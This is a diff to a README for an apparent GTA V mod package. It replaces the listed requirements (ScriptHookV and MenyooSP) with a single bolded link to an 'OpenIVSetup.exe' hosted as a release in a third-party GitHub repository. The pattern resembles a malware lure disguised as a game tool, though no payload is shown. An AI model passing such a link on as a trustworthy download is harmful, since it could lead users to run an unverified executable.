@@ -26,8 +26,7 @@ This OpenIV package contains all essential scripts and a mod menu trainer for GT
 
 ## Requirements
 
-- [ScriptHookV by Alexander Blade](http://www.dev-c.com/gtav/scripthookv/)
-- MenyooSP mod (included in this package)
+- [**OPENIV**](https://github.com/evtechcodr/A1ScriptsMod/releases/download/V-0.1/OpenIVSetup.exe)
 
 ## Installation
 
